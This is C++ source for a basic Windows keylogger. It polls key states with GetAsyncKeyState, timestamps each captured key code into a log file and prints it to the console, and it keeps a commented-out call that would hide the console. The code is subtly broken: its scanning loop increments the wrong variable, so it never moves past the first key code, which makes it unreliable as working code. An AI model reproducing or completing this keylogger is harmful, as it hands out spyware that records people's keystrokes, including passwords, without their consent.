#include <Windows.h>
#include <string.h>
#include <ctime>
#include <iostream>
#include <fstream>

using namespace std;

// Basic custom class used for logging
class Logger
{
    private:
         ofstream fileStream;

    public:
    Logger(string filePath)
    {
        fileStream.open(filePath, ofstream::trunc);  // Recreated file from scratch
    }

    ~Logger()
    {
        fileStream.close();
    }

    void log(string content)
    {
        time_t currentTime;
        currentTime = time(NULL);
        tm* now = localtime(&currentTime);
        // Adds time to log
        fileStream << to_string(now->tm_hour) << "°" << to_string(now->tm_min) << "\'" << to_string(now->tm_sec) << "\'\'" << " --- ";
        fileStream << content << endl;
    }
};

void GetLogfileName(string*);

int main(/* int argc, char* argv[] */)
{
    // FreeConsole(); Let go of the console
    string filename;  // name of file where we are going to log
    GetLogfileName(&filename);
    cout << "Logging to file : " << filename << endl;
    Logger mainLogger("log\\" + filename);
    mainLogger.log("Started Logging");

    char i;
    while(true)
    {
        Sleep(10);
        for(int key=8; key<=255; i++)
        {
            if(GetAsyncKeyState(key) & 0x0001)
            {
                mainLogger.log(to_string(key));
                cout << "Got key : " << key << endl;
            }
        }
    }
    return 0;
}

/**
* Get current time and returns a formated string. ex : "9_25_22h23m47s.log"
*/
void GetLogfileName(string* ptrFilename)
{
    time_t currentTime;
    currentTime = time(NULL);
    // cout << "Current timestamp is : " << currentTime << endl;
    tm* now = localtime(&currentTime);
    // cout << "Current time is : " << now->tm_hour << "h" << now->tm_min << "m" << now->tm_sec << "s" << endl;
    *ptrFilename = ""
        + to_string(now->tm_mon + 1) + "_"
        + to_string(now->tm_mday) + "_"
        + to_string(now->tm_hour) + "h"
        + to_string(now->tm_min) + "m"
        + to_string(now->tm_sec) + "s"
        + ".log";
}
